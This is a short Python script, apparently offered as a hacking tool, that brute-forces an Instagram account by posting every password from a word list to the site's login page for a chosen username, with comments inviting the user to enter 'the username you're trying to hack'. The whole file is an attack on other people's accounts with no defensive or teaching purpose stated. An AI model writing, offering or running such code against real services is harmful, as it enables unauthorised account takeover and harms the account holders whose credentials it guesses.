import requests

url = "https://www.instagram.com/accounts/login/"
pswd = open("pswd.txt", "r")

for line in pswd:
    password = line.strip()
    
    # add the username you're trying to hack in "account1" field, and use inspect element to find 'username','password','submit' field/value/class.
    http = requests.post(url, data={'username': 'account1', 'password': password, 'submit': 'submit'})
    content = http.content
    
    # To check if it's actually working, you can uncomment the following line 
    # print(http.status_code)

    if b"upload" in content:
        print("Password Found: " + password)
        break
    else:
        print('Password Incorrect: ' + password)
